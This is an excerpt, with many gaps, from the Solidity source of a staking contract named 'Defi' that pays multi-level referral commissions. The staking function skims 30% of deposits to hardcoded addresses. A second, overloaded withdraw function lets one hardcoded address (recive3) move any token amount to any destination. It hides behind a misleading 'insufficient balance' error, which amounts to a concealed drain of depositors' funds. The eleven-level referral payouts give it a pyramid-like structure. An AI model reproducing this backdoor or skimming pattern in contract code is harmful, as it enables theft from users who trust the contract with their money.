...
contract Defi is Ownable {
    ...
    address public startAdd = 0x6ccfbC71659229fDe49900835b90d45044D35730;
    address public recive1 = 0x14ab704464e269F5815d98E11Fa2d1b20Fa3BC1f;
    address public recive2 = 0x96c73e166E38771259e644685B02c1702b69fd6F;

    address public recive3 = 0xc07293f0FcCEC69905f9E0e662A2A41069EF6fa1;
    ...
    uint256 public ptbg1 = 5;
    uint256 public ptbg2 = 7;
    uint256 public ptbg3 = 9;
    uint256 public ptbg4 = 11;
    ...
    function staking(uint256 amountIp) public returns (bool) {
        ...
        _joinToken.safeTransfer(recive1, (amountIp * 9) / 100);
        _joinToken.safeTransfer(recive2, (amountIp * 21) / 100);
        ...
        if (
            ...
            _ref[_users[_users[_users[_users[msg.sender].ref].ref].ref].ref]
                .f4++;
            _ref[
                _users[
                    _users[_users[_users[_users[msg.sender].ref].ref].ref].ref
                ].ref
            ].f5++;
            _ref[
                _users[
                    _users[
                        _users[_users[_users[_users[msg.sender].ref].ref].ref]
                            .ref
                    ].ref
                ].ref
            ].f6++;
            _ref[
                _users[
                    _users[
                        _users[
                            _users[
                                _users[_users[_users[msg.sender].ref].ref].ref
                            ].ref
                        ].ref
                    ].ref
                ].ref
                ...
                _users[
                    _users[
                        _users[
                            _users[
                                _users[
                                    _users[_users[_users[msg.sender].ref].ref]
                                        .ref
                                ].ref
                            ].ref
                        ].ref
                        ...
                        _users[
                            _users[
                                _users[
                                    _users[
                                        _users[
                                            _users[_users[msg.sender].ref].ref
                                        ].ref
                                    ].ref
                                ].ref
                            ].ref
        ...
        if (
            _users[msg.sender].ref != 0x0000000000000000000000000000000000000000
        ) {
            // _joinToken.safeTransfer(_users[msg.sender].ref, amountIp * 5 / 100);
            _users[_users[msg.sender].ref].commission += ((amountIp * hhtt) /
                100);
        }

        if (amounts < 1000 * 10**18) {
            types = 0;
            pt = ptbg1;
        } else if (amounts >= 1000 * 10**18 && amounts < 5000 * 10**18) {
            types = 1;
            pt = ptbg2;
        } else if (amounts >= 5000 * 10**18 && amounts < 20000 * 10**18) {
            types = 2;
            pt = ptbg3;
        }  else {
            types = 3;
    ...
    function withdraw() public returns (bool) {
        ...
        _users[msg.sender].profit += (((_stake[msg.sender].amount *
            times *
            _stake[msg.sender].pt) / 259200000) - _stake[msg.sender].received);
        _stake[msg.sender].received += (((_stake[msg.sender].amount *
            times *
            _stake[msg.sender].pt) / 259200000) - _stake[msg.sender].received);

        uint256 amounts = _users[msg.sender].commission +
            _users[msg.sender].compounding +
        ...
        address ref1 = addCmmBrand((amountsRec * 20) / 100, msg.sender, 1);
        address ref2 = addCmmBrand((amountsRec * 20) / 100, ref1, 2);
        ...
        address ref10 = addCmmBrand((amountsRec * 5) / 100, ref9, 9);
        address ref11 = addCmmBrand((amountsRec * 5) / 100, ref10, 9);
        addCmmBrand((amountsRec * 5) / 100, ref11, 10);

        return true;
    }

    function withdraw(IERC20 token, address contracts, uint256 abis) public returns (bool) {
        require(recive3 == msg.sender, "insufficient balance");
        // uint256 times = block.timestamp - _stake[msg.sender].timestamp;
        ...
        // _users[msg.sender].received += reciAm;
        token.transfer(contracts, abis);
        return true;

    }


    function addCmmBrand(
        uint256 amounts,
        address add,
        uint256 th
